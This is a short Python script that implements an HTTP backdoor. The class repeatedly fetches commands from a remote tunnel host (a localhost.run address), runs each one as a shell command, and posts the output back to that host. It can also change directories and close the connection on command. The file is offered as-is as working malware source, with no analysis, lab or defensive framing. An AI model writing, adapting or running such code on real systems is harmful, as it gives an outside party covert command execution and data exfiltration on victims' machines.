import os
from requests import get, post
from subprocess import check_output

class HTTPBackdoor:
    def __init__(self, ip:str,  port:int=80, protocol:str='http', *kwargs) -> None:
        self.url = f'{protocol}://{ip}:{port}'


    def report(self, message:str):
        post(url=self.url, data=message)


    def exec_cmd(self, command):
        try:
            comm_res = check_output(command, shell=True).decode('utf-8')
            self.report(comm_res)
        except Exception as e:
            self.report(f'Exception : {e}')


    def cwd(self, path):
        try:
            os.chdir(path)
            self.report(f'[*] Path changed to {path}')
        except Exception as e:
            self.report(f'[!] Cannot change path due to exception : {e}')


    def connect(self):
        running = True
        while running:
            command = get(self.url).text.strip()
            
            if 'closeconn' in command:
                self.report('[*] Connection closed')
                running = False
            elif 'cd' in command:
                path = command.split(' ')[-1]
                self.cwd(path)
            else:
                self.exec_cmd(command)


if __name__ == '__main__':
    IP = '<random_characters>.localhost.run'
    PORT = 80
    backdoor = HTTPBackdoor(IP, PORT)
    backdoor.connect()
